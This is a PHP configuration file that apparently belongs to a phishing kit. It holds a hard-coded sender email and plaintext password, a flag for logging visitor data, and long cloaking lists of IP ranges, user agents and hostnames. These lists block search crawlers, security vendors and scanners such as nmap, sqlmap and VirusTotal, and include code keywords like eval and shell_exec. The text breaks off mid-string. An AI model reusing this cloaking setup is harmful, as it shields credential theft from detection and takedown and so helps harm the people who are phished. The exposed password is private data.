<?php

$from_email    = "hero@aman.website";
$email_pass    = "besoeasy99";
$mail_service  = "site"; /* hotmail OR gmail OR site (mail from your server)*/
$enable_mobile     = true;  /* set to false to treat mobile users like regular desktop users */
$javascript_data   = true;  /* something something logging user info */


$iplist   = array('101.226.65.0/24','103.246.248.0/24','103.28.40.0/22','107.20.181.0/24','107.20.22.0/24','107.21.60.0/24','108.166.0.0/17','108.171.160.0/19','108.3.64.0/18','108.62.0.0/16','109.109.131.0/24','109.121.0.0/18','109.123.126.0/24','109.169.0.0/17','109.200.0.0/19','109.230.197.0/24','109.230.213.0/24','109.230.216.0/23','109.230.220.0/22','109.230.244.0/23','109.230.246.0/24','109.230.248.0/23','109.230.251.0/24','109.73.64.0/20','109.73.96.0/20','109.75.160.0/21','112.64.235.0/24','113.108.0.0/16','113.160.0.0/11','114.43.183.0/24','116.71.0.0/16','118.175.254.0/23','118.98.0.0/17','119.147.0.0/16','119.152.0.0/13','120.0.0.0/12','121.14.0.0/16','121.204.0.0/14','122.182.2.0/24','123.112.0.0/16','123.125.0.0/16','123.160.0.0/14','124.123.0.0/16','128.111.48.0/24','128.242.249.0/24','130.209.0.0/16','134.8.0.0/24','134.8.2.0/24','141.11.0.0/16','141.223.128.0/18','141.223.64.0/18','142.0.32.0/22','142.54.160.0/19','146.0.74.0/24','149.154.158.0/24','149.255.32.0/21','149.3.128.0/21','150.70.64.0/24','158.255.213.0/24','164.177.128.0/19','166.90.142.0/24','172.16.0.0/12','173.0.48.0/20','173.192.78.0/24','173.203.0.0/16','173.208.0.0/17','173.234.0.0/16','173.236.29.0/24','173.243.112.0/20','173.255.233.0/24','173.45.224.0/19','174.127.132.0/24','174.137.48.0/20','174.143.0.0/16','174.143.143.0/24','174.34.128.0/18','175.107.191.0/24','176.227.192.0/20','176.31.50.64/27','176.9.138.0/24','178.137.128.0/24','178.239.48.0/20','178.255.36.0/23','178.255.38.0/24','178.32.0.0/15','178.32.226.0/24','178.73.192.0/18','180.153.0.0/16','180.76.5.0/24','182.176.0.0/12','183.60.2.0/24','184.106.0.0/16','184.154.224.0/24','184.169.242.0/24','184.22.48.18','184.72.11.0/24','184.72.210.0/24','184.72.22.0/24','184.82.29.0/23','184.82.29.0/24','185.5.44.0/22','187.32.0.0/16','188.126.64.0/19','188.134.0.0/20','188.143.232.0/24','188.165.247.0/24','188.168.0.0/16','188.208.0.0/20','188.208.32.0/23','188.215.0.0/24','188.215.32.0/22','188.227.160.0/19','188.229.103.0/24','188.229.104.0/21','188.229.124.0/22','188.229.19.0/24','188.229.20.0/22','188.229.38.0/24','188.240.160.0/20','188.240.192.0/19','188.240.32.0/22','188.240.36.0/22','188.247.128.0/24','188.247.228.0/23','188.252.237.0/23','188.72.192.0/18','188.92.72.0/21','189.112.0.0/16','189.15.0.0/16','189.41.0.0/16','190.122.160.0/20','190.123.32.0/20','192.119.144.0/20','192.168.0.0/16','192.204.40.0/21','193.105.134.0/24','193.105.210.0/24','193.109.248.0/23','193.142.244.0/24','193.180.125.0/24','193.189.126.0/23','193.200.150.0/24','193.201.200.0/23','193.227.244.0/23','193.53.80.0/20','194.106.188.0/22','194.126.172.0/22','194.165.42.0/24','194.24.188.0/23','194.28.112.0/22','194.8.74.0/23','195.159.140.0/24','195.162.68.0/23','195.189.80.0/22','195.191.144.0/23','195.2.252.0/23','195.216.160.0/19','195.238.0.0/17','195.238.64.0/18','195.242.152.0/23','195.242.214.0/23','195.40.15.0/24','195.62.10.0/23','195.62.24.0/23','195.87.102.0/24','195.88.0.0/16','198.101.128.0/17','198.144.116.0/24','198.184.18.0/24','198.186.190.0/23','198.187.31.0/24','198.50.128.0/17','198.61.128.0/17','199.119.224.0/22','199.15.212.0/22','199.15.234.0/24','199.16.156.0/22','199.167.196.0/22','199.180.128.0/21','199.187.164.0/22','199.192.200.0/21','199.195.140.0/23','199.241.120.0/21','199.59.148.0/22','199.66.200.0/24','199.91.52.0/23','199.96.56.0/24','199.96.57.0/24','199.96.82.0/24','200.146.192.0/18','200.170.128.0/17','200.225.192.0/18','200.233.128.0/17','200.63.40.0/21','201.16.128.0/17','201.48.0.0/16','202.125.128.0/19','202.156.11.0/24','202.70.144.0/20','203.128.252.0/22','203.135.0.0/18','203.175.107.0/24','203.55.21.0/24','203.99.160.0/19','204.11.16.0/22','204.124.180.0/22','204.13.164.0/22','204.14.90.0/24','204.15.224.0/19','204.232.128.0/17','204.236.141.0/24','204.236.159.0/24','204.244.109.240/29','204.244.120.176/29','204.45.0.0/16','204.46.32.0/19','204.8.34.0/24','205.166.177.0/24','206.161.0.0/16','206.188.192.0/19','206.196.110.0/23','207.235.16.0/23','207.235.4.0/22','207.32.116.0/24','207.38.118.0/24','207.71.44.0/23','207.71.8.0/24','207.97.192.0/18','208.100.62.0/23','208.131.138.0/24','208.177.72.0/24','208.43.224.0/19','208.53.128.0/18','208.64.200.0/22','208.64.24.0/22','208.66.97.0/24','208.68.37.0/24','208.78.96.0/21','208.80.192.0/21','208.89.208.0/21','208.99.192.0/18','209.114.32.0/19','209.114.36.0/24','209.160.33.0/24','209.163.232.0/21','209.163.244.0/22','209.163.248.0/22','209.20.64.0/19','209.216.104.0/21','209.249.0.0/16','209.51.184.0/24','209.61.128.0/18','209.73.132.0/24','211.64.0.0/10','212.100.224.0/19','212.113.32.0/19','212.117.188.0/24','212.142.64.0/18','212.15.0.0/16','212.152.60.0/22','212.178.0.0/19','212.252.24.0/21','212.64.128.0/19','212.95.0.0/16','213.131.235.0/24','213.166.128.0/19','213.171.218.0/24','213.182.192.0/19','213.186.119.0/24','213.186.127.0/24','213.203.203.0/24','213.219.192.0/18','213.228.193.0/24','213.248.0.0/18','213.251.189.0/24','216.105.48.0/20','216.110.32.0/20','216.135.112.0/21','216.17.103.0/24','216.172.128.0/19','216.172.135.0/24','216.172.142.0/24','216.172.147.0/24','216.18.144.0/21','216.193.237.0/24','216.231.128.0/20','216.240.128.0/19','216.244.64.0/19','216.244.84.0/22','216.59.16.0/22','216.6.224.0/20','216.86.152.0/21','217.147.80.0/20','217.149.63.0/24','217.195.202.0/24','217.20.112.0/20','218.56.21.0/24','220.181.0.0/16','220.181.51.0/24','222.124.0.0/16','23.19.0.0/16','23.20.123.0/24','23.20.30.0/24','23.22.39.0/24','23.29.125.0/24','31.2.216.0/21','31.214.155.0/24','31.214.232.0/20','31.220.128.0/22','31.222.128.0/18','31.3.224.0/19','31.47.208.0/21','37.1.200.0/20','37.157.240.0/21','37.188.96.0/19','37.200.98.0/24','37.220.0.0/19','37.72.168.0/21','37.9.53.0/24','38.113.234.0/24','38.99.102.0/24','39.40.0.0/13','39.48.0.0/12','4.78.243.0/24','41.210.192.0/18','46.108.128.0/21','46.108.144.0/21','46.108.155.0/24','46.108.240.0/21','46.118.115.0/24','46.17.96.0/21','46.21.144.0/20','46.23.32.0/20','46.246.0.0/17','46.251.228.0/23','46.29.248.0/23','46.38.160.0/19','5.104.241.0/24','5.133.192.0/19','5.135.18.0/24','5.135.242.0/24','5.144.176.0/21','5.144.176.0/24','5.153.239.0/24','5.198.248.0/21','5.249.160.0/21','5.254.128.0/19','5.79.0.0/18','5.9.80.0/24','50.115.160.0/20','50.117.59.0/24','50.18.103.0/24','50.28.192.0/22','50.56.0.0/15','50.7.0.0/16','54.241.45.54','59.103.0.0/16','59.148.192.0/18','59.60.0.0/15','59.93.0.0/16','62.212.76.0/24','62.41.26.0/23','63.141.198.0/24','63.143.48.0/24','63.148.99.0/24','63.150.152.0/24','63.224.0.0/12','63.232.227.0/24','64.116.161.0/24','64.117.234.0/24','64.120.0.0/17','64.128.80.0/22','64.250.144.0/20','64.39.0.0/19','64.49.192.0/18','64.64.224.0/19','64.79.96.0/20','65.208.151.0/24','65.52.0.0/24','65.61.128.0/18','65.94.3.0/24','65.98.0.0/17','66.135.48.0/24','66.151.103.0/24','66.207.167.0/20','66.216.64.0/18','66.228.192.0/19','66.228.37.0/24','66.249.82.0/24','66.45.237.0/24','66.7.192.0/19','66.90.64.0/18','66.96.128.0/18','67.159.0.0/18','67.192.0.0/16','67.195.0.0/16','67.198.128.0/20','67.201.0.0/21','67.201.40.0/24','67.201.48.0/23','67.207.128.0/19','67.207.202.0/24','67.208.5.0/24','67.23.0.0/19','67.23.32.0/20','67.230.160.0/19','68.168.128.0/20','68.168.216.0/24','68.68.107.0/24','69.1.69.0/23','69.147.224.0/19','69.147.224.0/23','69.16.192.0/24','69.163.170.0/24','69.174.60.0/22','69.175.118.0/24','69.20.0.0/17','69.210.185.0/24','69.25.250.0/23','69.31.104.0/22','69.36.0.0/20','69.72.128.0/19','69.84.192.0/20','69.89.16.0/20','69.94.212.0/24','70.32.32.0/20','70.32.48.0/24','72.20.99.0/24','72.233.96.0/24','72.27.0.0/16','72.3.128.0/17','72.30.0.0/16','72.32.0.0/16','72.37.145.0/24','72.37.204.0/24','72.37.218.0/23','72.37.221.0/24','72.37.222.0/23','72.37.224.0/21','72.37.237.0/24','72.37.242.0/23','72.37.246.0/23','72.4.112.0/20','72.52.96.0/24','74.112.128.0/22','74.115.0.0/21','74.117.236.0/22','74.119.216.0/22','74.121.180.0/22','74.122.192.0/21','74.123.152.0/22','74.125.182.0/23','74.125.184.0/24','74.205.0.0/17','74.207.254.0/24','74.208.16.0/24','74.221.208.0/20','74.50.103.0/24','74.55.73.0/24','74.63.64.0/18','74.82.192.0/19','74.86.149.0/24','74.91.84.0/22','74.91.88.0/21','76.73.0.0/16','77.105.0.0/18','77.223.128.0/19','77.245.64.0/20','77.51.0.0/18','77.92.88.0/23','78.110.175.0/24','78.129.128.0/17','78.129.202.0/23','78.136.0.0/18','78.157.140.0/22','78.158.11.0/24','78.159.96.0/19','78.24.0.0/14','78.37.128.0/18','78.40.224.0/21','79.143.177.0/24','79.174.64.0/19','79.175.64.0/18','8.28.19.0/24','80.243.176.0/20','80.26.132.167','80.67.0.0/20','80.81.159.0/24','80.81.208.0/20','80.83.112.0/20','80.84.48.0/20','80.87.152.0/24','80.93.122.0/24','81.16.0.0/12','81.21.74.0/24','81.223.254.0/24','81.23.0.0/18','81.252.211.0/23','81.88.49.0/24','81.94.192.0/20','82.145.32.0/19','82.165.40.0/24','82.193.64.0/19','83.138.128.0/18','83.142.224.0/21','83.167.104.0/21','83.167.127.0/24','83.167.98.0/23','83.170.117.0/24','83.229.128.0/17','83.233.0.0/18','83.239.214.0/24','83.69.16.0/24','83.99.128.0/17','84.16.224.0/19','84.201.224.0/20','85.131.188.0/22','85.248.0.0/14','86.104.211.0/24','87.101.0.0/20','87.117.192.0/18','87.118.64.0/18','87.245.192.0/18','87.248.160.0/19','87.248.64.0/19','87.249.96.0/19','89.108.64.0/18','89.113.72.0/21','89.149.192.0/18','89.234.0.0/18','89.248.160.0/20','89.254.192.0/18','89.36.232.0/22','89.37.132.0/24','89.40.36.0/23','89.41.172.0/23','89.42.108.0/23','89.42.31.0/24','89.42.8.0/24','89.44.16.0/20','89.46.132.0/22','91.191.160.0/20','91.195.234.0/23','91.198.218.0/24','91.202.0.0/16','91.204.72.0/22','91.205.168.0/24','91.205.40.0/22','91.205.64.0/18','91.207.4.0/24','91.212.0.0/16','91.213.246.0/24','91.214.44.0/23','91.217.189.0/24','91.225.0.0/22','91.226.147.0/24','91.227.208.0/24','91.236.116.0/24','91.236.74.0/23','91.240.64.0/22','92.241.0.0/16','92.244.0.0/16','92.38.128.0/17','92.45.72.0/24','92.52.64.0/18','93.113.36.0/23','93.115.204.0/24','93.115.206.0/24','93.115.240.0/23','93.115.241.0/24','93.118.64.0/20','93.174.88.0/21','93.182.0.0/16','93.182.128.0/18','93.187.200.0/21','93.89.23.0/24','94.100.16.0/20','94.102.48.0/20','94.102.48.0/22','94.142.128.0/23','94.177.4.0/23','94.181.0.0/16','94.236.0.0/17','94.60.152.0/21','94.60.160.0/19','94.60.192.0/21','94.63.0.0/19','94.63.128.0/21','94.63.152.0/21','94.63.192.0/20','94.63.32.0/20','94.63.56.0/21','94.63.64.0/21','95.128.0.0/13','95.128.0.0/14','95.128.0.0/15','95.128.168.0/24','95.128.174.0/23','95.129.192.0/19','95.138.128.0/18','95.154.192.0/18','95.168.160.0/19','95.187.0.0/17','95.211.84.0/22','95.24.0.0/16','95.64.110.0/23','95.64.24.0/21','95.64.32.0/24','95.64.41.0/24','95.64.42.0/24','95.64.46.0/24','95.79.0.0/16','96.45.176.0/20','98.126.0.0/16','98.129.0.0/16','98.176.53.0/24','98.252.176.0/24');

$bot_list = array('/seo','200please','360spider','3d-ftp','3mir','80legs','_sitemapper','abot','aboundex','accelo','acme.spider','acoonbot','add catalog','adwords','aesop_com_spiderman','affinity','aghaven','ahref','aihitbot','aipbot','allsubmitter','almaden','alphaserver','america online browser','analyticsseo','anonymouse','anyevent-http','anzwerscrawl','appengine-google','appie','apptusbot','artviper','ashes','asia','athens','attache','atwatch-bot','autoemailspider','autohttp','automattic analytics crawler','b55','backlink','bad-neighborhood','baidu','bandit','bazqux','bender','big brother','bigfoot','bitvo','black widow','blackwidow','blekko','blogbot','bnf.fr','boardreader','bogahn','boitho','bootkit','botz','bpimagewalker','brandwatch','bsalsa','bullseye','butterfly','camontspider','careerbot','casino','casper bot','cazoodle','ccbot','centiverse','ceptro','cha0s','cherry','chilkat','chimp','chinaclaw','cloakbrowser','cmradar','cmsworldmap','cncdialer','coccoc','collect','comment','commoncrawl','compspy','control','convera','copier','copyright','cosmos','coverscout','cpython','cr4nk','craftbot','crawler','crawler4j','crawlfire','crescent','crowsnest','crystalsemanticsbot','curious george','curl/','custo','cyberpatrol','cybeye.com','cydral','datacha','dataprovider','davclnt','daylife','dcpbot','debate','deepnet','desktopsmiley','dex bot','diavola','digext','digger','digout4uagent','diibot','disco','discoverybot','dispatcher','dittospyder','dkimrepbot','dot tk','dotbot','dotcomdotnet','dotnetdotcom','doubanbot','download','dragostea','ds_juicyaccess','dsarobot','dts agent','dtsearchspider','dumbot','eak01ag9','easouspider','ecatch','ecollector','ecxi','edition campaign','edition yx','eidetica','email siphon','emailcollector','emailex','emailsearch','emailsiphon','embedly','enabot','encyclopedia','enhancer','envolk','eurobot','exabot','explorer','extractor','eyenetie','ezoom','ezooms','facebookscraper','fairshare','fantombrowser','fast crawler','fast enterprise crawler','fastbot crawler','fastlwspider','fastseek','feed seeker bot','feedfetcher','fetch','fhscan','fibgen','filterdb.iss.net','finder','findlinks','firefly','firefox addon','firefox/0.','firefox/2.0.0.','firefox/3.0.','firefox/3.1.','firefox/4.','firefox/5.','firefox/7.','firefox/8.','flashget','flightdeckreportsbot','flipboard','floodgate','flunky','foxy/1','free thumbnails','froogle','fuck','gaisbot','genieo','getcsv','getlinkinfo','getright','gets','getty','geturl11','getweb!','gigabot','girafa','girafabot','go!zilla','googlealerts','gootkit','grabber','grabnet','grafula','grub','gslfbot','gurujibot','hack-bay.com','harvest','heartrails_capture','heritrix','hmview','holmes','htmlparser','http fetcher','http://lycosa.se','http://www.mozilla/','httpfetcher','httplib','httpunit','httrack','huawei','huaweisymantecspider','humanlinks','icafe','ichiro','id-search','idbot','image fetcher','imagewalker','inagist','incywincy','indocom','indy library','influencebot','infonavirobot','infoseek','inktomi','inspyder-crawler','intelium','intelliseek','interget','internet explorer','internetseer','intraformant','ip-web-crawler.com','ips-agent','irc search','irgrabber','irlbot','isc systems','isense bot','isset','ixebot','jadynavebot','jakarta','java/','jeeves','jennybot','jetcar','jike','joc web spider','jomjaibot','js-kit','k2spider','kangen','kenjin','keywenbot','keyword','kimengi','kkman','kmccrew','komodiabot','kraken','larbin','leechftp','length','lexi','lexxebot','library','libweb','libwww','linguee','linkdex','linkedfromtwitter','linksmanager','linkwalker','liperhey','lipperhey','lnspiderguy','loader','looksmart','lushbot','lwp','lycos','magnet','magpie','mahiti','mahonie','mail.ru','mama casper','mama cyber','marketdefenderbot','markwatch','mattters','maxpointcrawler','megaupload','mentormate','metadatalabs','mia bot','microsoft url','microsoft-webdav','midown','miixpc','miner','miniredir','mirrordetector','missigua','mister','mj12bot','mlbot','modez','moget','monkey','moreover','morfeus','mot-v980','movable','mozilla/0.','mozilla/1.','mozillaxyz','mrchrome','mrie8pack','mrsputnik','msfrontpage','msie 0.','msie 2.','msie 3.','msie 4.','msie 5.','msie 999.1','msiecrawler','multicrawler','nameprotect','nationaldirectory','navigator','navroad','nearsite','neofonie','nessus','netants','netcraft','netestate','netmechanic','netseer','netspider','netzip','news bot','nicebot','nicerspro','nineconnections','ning/1.0','ninja','njuicebot','nmap','nomad','npbot','nsplayer','nutch','object-extractor','obot/2.3.1','octopus','offline navigator','omgilibot','omniexplorer','oozbot','openfind','opera/0.','opera/2.','opera/3.','opera/4.','opera/5.','opera/6.','opera/7.','opera/8.','ourbrowser','ow.ly web crawler','packrat','page fetcher','page_verifier','pagegetter','pagesinventory','pagesummary','paloaltonetworks','panscient','paperlibot','parsijoo','patchone','path 2','pavuk','pcbrowser','peerindex','pentru','peoplepal','perl','photon','phpcrawl','picaloader','picgrabber','pics','picsearch','pictsnapshot','picture finder','ping','pipl','pixmatch','pixray','place','planetwork','plukkie','poe-component-client-http','pogs','powerbot','powermarks','profiler','proximic','psbot','psurf','psybnc','psycheclone','pub-crawler','purebot','purity','pycurl','python','qqdownload','qqpinyinsetup','queryseekerspider','quester','r00t','r6_','rabaz','radian6','rankivabot','ratup.com','reaper','rebi-shoveler','reget','reverseget','rganalytics','ripper','robozilla','rogerbot','root','rpt-httpclient','rsync','ruby','rulinki','ruru','ryze','safemode','saidwot','salad','sample','sasqia','sauger','sbider','sbl-bot','sbl.net','scan','scannerz','schema','scooter','scoutabout','scoutjet','scrape','scspider','searchdnabot','searchme','searchmetricsbot','sedo_parking_robot','seekbot','seekeu-bot','semanticdiscovery','semrush','seo/','seoeng','seohunt','seokicks','seoprofiler','seostat','seostats','seznam','shai','sheenbot','sicent','sickseo','similarpages','siphon','sistrix','sitebot','siteexplorer','siteintel','sitespeedbot','sledink','slysearch','smile seo tools','smileseotools','snagger','snapbot','sniper','snoopy','socialradarbot','socialsearcher','sogou','sohu','solomonobot','soso','spade','spank','spanner','spbot','spinn3r','splashtop','sputnik','ssearch','stackrambler','start.exe','statusnet','stealthbrowser','steeler','stripper','sucker','supendobot','superbot','superhttp','surfbot','surveybot','suzuran','swebot','szukacz','t-h-u-n','t8abot','tackle','tagsdir','takeout','tasapspider','technoratisnoop','tecnoseek','tecomac-crawler','teleport','telesoft','tencenttraveler','teradex mapper','theworld','thumbshots-de-bot','tineye','tiptop','titan','tivraspider','to-night-bot','toata','tocrawl','topseo','toscrawler','tourist crawler','traumacadx','trendictionbot','trivial','true_robot','turingos','turnitinbot','twat','twengabot','twisted pagegetter','twitjobsearch.com','twitterbot','u01-2','ucmore','unmask-parasites','updowner','upictobot','url_spider_sql','user-agent','vagabondo','validator','vampire','vbseo','virustotalcloud','visbot','vlc/','voideye','voilabot','voyager','vurl','wada.vn','walker','wangidspider','warebay','warning','wasalive-bot','wauuu','wbsearchbot','web downloader','webalta','webauto','webbot','webbug','webcapture','webclipping','webcollage','webcompanycrawler','webfetch','webfilter robot','webfindbot','webfluenz','webgo','webleacher','webmastercoffee','webmoney advisor','webot','webpictures','webrank','webreaper','webripper','websauger','webscanner','websquash','webster','webstripper','webviewer','webwhacker','webzip','wells','wget','whitehat','whizbang','whois365 inquirer','widow','wikio','willow','willow internet crawler','windows 3','windows 95','windows 98','windows seven','winhttp','winhttprequest','wire','wise-guys','wolf','wordchampbot','wordpress ha','wordpress.com mshots','woriobot','worldbot','wotbox','vbseo.com','wwwoffle','x-crawler','xaldon','xenu','xirio','xmpp tiscali communicator','xpymep','xrumer','xtractorpro','yacy','yadirectbot','yahooseeker','yandeg','yandex','yeti','yfsj crawler','yodao','yolinkbot','yoofind','youdao','your-search-bot','zealbot','zermelo','zeus','zmeu','zumbot','zyborg','Bork-edition','.NET CLR 1.1.4322; PeoplePal 6.2','.NET CLR 2.0.50727; AskTbPTV/5.11.3.15590','Chrome/18.0.1025.1634 Safari/535.19 YE','Chrome/18.0.1025.1634 Safari/535.19 YI','mozilla/2.0 (compatible; ask/teoma)','mozilla/3.0 (compatible;)','mozilla/4.0 (compatible; ics 1.2.105)','mozilla/4.0 (compatible; msie 6.0; windows xp)', 'Windows 98', 'Windows 95', 'MSIE 2', 'MSIE 3', 'MSIE 4', 'Win95', 'Windows_95', 'Win98', 'NT 5.2', 'Windows 2000', 'NT 5.0',
'$_GET','%0','%1','%8','%9','%A','%B','%C','%D','%E','%F','%a','%b','%c','%d','%e','%f','/a>','<?php','<a','<pre','<script','/pre>','/script>','_once','_table','`','ashes','assert','code','contents','database','dotnet_load','droptable','droptable','echo','ereg','eregi','escape','eval','exec','executable','exists','file','function','getc','getcsv','gets','gzinflate','href','iable','iframe','include','length','nable','place','plode','puts','read','require','restore','rot13','sable','schema','select','shell_exec','start','system','thru','unction','unserialize','while','write','acunetix','dirbuster','fimap','jbrofuzz','libwhisker','nessus','nikto','openvas','sqlmap','w3af','webshag','whatweb','archive.org_bot','bitlybot','butterfly','duckduckbot','email','expandurl','facebookexternalhit','fetch','google-test','hotbot','ia_archiver','instagram','longurl api','magpie-crawler','metauriapi','mfe_expand','netestate','rebelmouse','showyoubot','sitelockspider','slurp','teoma','topsy','tweetedtimes','tweetmemebot','twikle','twitterbot','twitterfeed','linkedinbot','unshort','untiny','unwindfetchor','webfluenz','yahoo pipes','yahoo!slurp','aol.','.ask.','abacho','abizdirectory','about','acoon','allpages','allthesites','alltheuk','alltheweb','altavista','america','bot','bingbot','bingpreview','brainysearch','crawl','dmoz','dogpile','ebay','ehow','entireweb','euroseek','exalead','excite','facebook','fastbot','filesearch','-goo','google','google web preview','hispavista','hotbot','linkedin','live','lycos','mamma','metabot','metacrawler','metaeureka','mojeek','msn','msnbot','msrbot','myspace','netscape','obot','pinterest','rambler','search','spider','teoma','terra','tiscali','twitter','vkontakte','voila','wanadoo','web-archiv','webalta','webcrawler','websuche','yahoo','yandex','yell','youtube','zoneru');

$host_list = array('10gen.com','12designer.com','163data.com.cn','1978th.net','1e100.net','23gb.com','2dayhost.com','35up.com','3fn.net','3leafsystems.com','3tera.com','45ru.net.au','aaxj78.neoplus.adsl.tpnet.pl','accelovation.com','accentrainc.com','aceleo.com','aconex.com','adsinmedia.co.in','adsl.static.ccgg.telefonica.net','adtechnology.lv','advologix.com','agathon.com','agava.net','ahost01.de','ahrefs.com','airtelbroadband.in','albacom.net','alicedsl.de','altornetworks.com','altushost.com','americanforeclosures.com','amitive.com','amplilogic.com','anchorfree','andersdenken.at','appian.com','appirio.com','appistry.com','appjet.com','appnexus.com','apprenda.com','appzero.com','aptana.com','ariasystems.com','arjuna.com','artofdefence.com','as13285.net','asianet.co.th','asterdata.com','astranight.com','asyanka.com','authenticnetworks.com','azati.com','basesofthost.com','bb.netbynet.ru','beam4d.com','beowulf.org','bestprice.com','bezeqint.net','bhivesoft.com','birtondemand.com','blinklogic.com','bluelock.com','bluewolf.com','boardreader','boomi.com','borderfreehosting.com','box.net','brandaffinity.net','brasiltelecom.net.br','bucketexplorer.com','bungeeconnect.com','business.telecomitalia.it','buyurl.net','cadinor.com','camsolutionsinc.com','candycloud.eu','caspio.com','cassatt.com','castiron.com','cbcjobs.com','ceptro','chello.pl','cjh-law.com','clanmoi.de','clarioanalytics.com','clickability.com','cloud.com','cloud42.com','cloud9analytics.com','cloudcomputingchina.com','cloudcontrol.com','cloudera.com','cloudfoundry.com','cloudkick.com','cloudscale.com','cloudstatus.com','cloudswitch.com','cloudworks.com','clusterseven.com','coghead.com','cohesiveft.com','coldlightsolutions.com','collab.net','colo.iinet.com','colo.transip.net','colocrossing.com','colts.dreamhost.com','concur.com','controltier.com','corbina.ru','cosmonova.net.ua','cpms.ru','crawl.baidu.com','creatoor.com','cricketfresh.in','cssgroup.lv','ctbcnetsuper.com.br','ctera.com','ctinets.com','cwjamaica.com','dataline.com','datapoint.ru','datasisar.com','datasynaps.com','dedibox','dedipower','dimenoc.com','directlaw.com','dl-hosting.com','dns-safe.com','dnsresearch.dnsdigger.com','doclanding.com','doctore.sk','dotnetdotcom.org','dr-wolfe.w3.org','dragonara.net','dreamhost.com','dropbox.com','dumpyourbitch.com','duo.carnet.hr','dyn.com','dynamsoft.com','eastwood.cs.ucsb.edu','ecatel','efdns.de','elastichosts.com','elastra.com','elsv-v.ru','em-zwo.de','emc.com','engineyard.com','enkiconsulting.net','enomalism.com','enstratus.com','ertelecom.ru','esonicspider.com','etelos.com','ethymos.com.br','eucalyptus.com','eucalyptus.cs.uscb.edu','evapt.com','evionet.com','exabot.com','exatt.net','fastlink.lt','fathomdb.com','fidelity.com','filmefashion','filterdb.iss.net','flexiscale.com','fluidhosting.com','followmeoffice.com','force.com','fortressitx.com','fsfreeware.com','g.ho.st','gemstone.com','giga-dns.com','gigaspaces.com','gigavenue.com','glasfaserostbayern.de','gnip.com','gogrid.com','googlealert.com','gprs.kyivstar.net','gridlayer.com','groupenevis.net','gt500.org','gvt.net.br','haebdler-treff.de','hbw.hbwsl.com','hc.ru','heroku.com','hexagrid.com','hinet.net','hn.kd.ny.adsl','holhost.com','host.caracastelecom.net','hostacy.com','hosteurope','hosting-ie.com','hosting.com','hostkey.ru','hostnoc.net','hostrov.net','hotchilli.net','hotspotshield','hubspan.com','hyperic.com','iam.net.ma','iboss.org','icims.com','icloud.com','ideastack.com','idknet.com','ig.com.br','ihc.ru','imodrive.com','infobox.org','infobox.ru','infobright.com','infong657.lxa.perfora.net','informatica.com','insite.com.br','internetserviceteam.com','investmentslasvegas.com','ip.tor.radiant.net','ipilum.com','ipredate','ipredator.se','ipvnow.com','is74.ru','isnet.net','itce5.postech.ac.kr','itns.ru','itricityhosting.com','ivegotafang.com','iweb.ca','iweb.com','jiffybox.net','jkserv.net','joyent.com','jumpbox.com','junglebox.com','justhost.com','k2analytics.com','kaavo.com','kemhost.net','keyaccount.de','keymachine','keymars64.de','keynote.com','keyserver','keyweb','kimsufi.com','kiyosho.jp','knowledgetree.com','kosmix.com','krypt.com','kuzbass.net','kyivstar','kyklo','laycat','layeredtech.com','leaseweb.com','limt.ru','linkneo.com','liveops.com','loadstorm.com','logixml.com','longjump.com','ltdomains.com','mail.adc.de','mail.ru','majestic','majordomo.ru','mantraonline.com','mastak.net','mb-internal.com','mbox.kz','megacom.biz','memcached.org','mgts.by','midphase.com','moderro.com','mohitseo.com','mor.ph','morphexchange.com','mosso.com','mozy.com','mpynet.fi','mtu-net.ru','mtunet.ru','mturk.com','mulesoft.com','myforexvps.com','mysteryfcm.plus.com','nasstar.com','nasza-klasa.pl','negypolus.hu','neointeractiva.com','net.co','netapp.com','netbynet.ru','netdocuments.com','netorn.net','netorn.ru','netsuite.com','nettopia.com','netvision.net.il','networkphantom.net','newrelic.com','newservers.com','nigma.ru','nionex.com','nirvanix.com','no-dns-yet.ccanet.co.uk','novatium.com','nscaled.com','oco-inc.com','odessa.ua','ogicom.pl','oliro','onelogin.com','onlinehome-server.com','onlinehome-server.info','onlinehome-server.net','onpathtech.com','opennebula.org','openqrm.com','opsource.com','optimal.de','orange.sk','oroxy.com','ovh.net','page-store.com','pagepeeker.com','panorama.com','parallels.com','parascale.com','parature.com','phatservers.com','piemontetv.com','pinqidentity.com','pivotlink.com','pldt.net','pluraprocessing.com','pointandchange.com','poltava.ua','pool-xxx.hcm.fpt','pool.ukrtel.net','power-web34.net','privatedns.com','prking.com.au','profithost.net','prommorpg.com','propagation.net','purehosting.nl','qlayer.com','qrimp.com','quadranet.com','quantivo.com','quantix-uk.com','quest.com','qvt.net.br','rackspace.com','rackspacecloud.com','rbn.com.ua','rdns.ubiquity.io','rdsnet.ro','redi2.com','reductivelabs.com','relakks.com','relan.ru','reliablehosting.com','reliacloud.com','responsys.com','retail.telecomitalia.it','rightnow.com','rightscale.com','rima-tde.net','rivreg.ru','rollbase.com','rootbash.de','rpath.com','rulinki.ru','rysiek2.neutrinus.com','sakura.ne.jp','salesforce.com','savvis.com','securewebserver.de','seomoz.org','sertifi.com','server.de','server.lu','server12.ourlinuxnetwork.com','server4you.de','server79.web-hosting.com','servinio.com','setooz.com','siteground152.com','siteprotect.com','skytap.com','slaskdatacenter.pl','slicehost','smartservercontrol.com','snaplogic.com','soasta.com','soempresas22.com','softel.com.pl','softlayer.com','sovam.net.ua','spamahost','spb.ru','springcm.com','spunge.org','starlogic.biz','starnet.md','startdedicated.com','static-ip.oleane.fr','static.albacom.net','static.maximumasp.com','stax.com','steephost.com','steephost.net','streetsmarts.com','successmetrics.com','superslickydeals.com','swebot','swifttrim.com','symplified.com','syncplicity.com','systems.tiggee.net','tadpole.postech.ac.kr','tagdance.de','taleo.com','tcom.sk','technicolor.com','telecom.net.ar','telsp.net.br','temka.biz','terracotta.org','terremark.com','thegridlayer.com','theprocessfactory.com','thinkgos.com','thoughtexpress.com','tiscali.it','totalstat.ru','tpnet.pl','traders-briefing.de','triolan','trustsaas.com','ttnet.com.tr','utel.net.ua','utilitystatus.com','uxxicom.com','vampire.pl','vaultscape.com','vdswin.com','vectranet.pl','veloxzone.com.br','vertica.com','vilitas.de','vip-net.pl','vmware.com','voda.com','volia.net','volia.ua','vordel.com','voxel.net','vpn.ipredator.se','vpsnow.ru','vtr.net','w-4.de','wahome.ru','wajam.com','webalta','webfusion.co.uk','webhosting.uk.com','webhostserver.biz','webmonkie.com','webscalesolutions.com','websiteworthrank.com','workday.com','x-svr.com','xactlycorp.com','xcalibre.co.uk','xcelmg.com','xen.org','xythos.com','yandex','your-server.de','zembly.com','zetta.net','zimory.com','zmanda.com','zoho.com','zoominternet.net','zuora.com','148.96.233.72.static.reverse.ltdomains.com','klout.com','mcafee.com','sitelock.com','spiderduc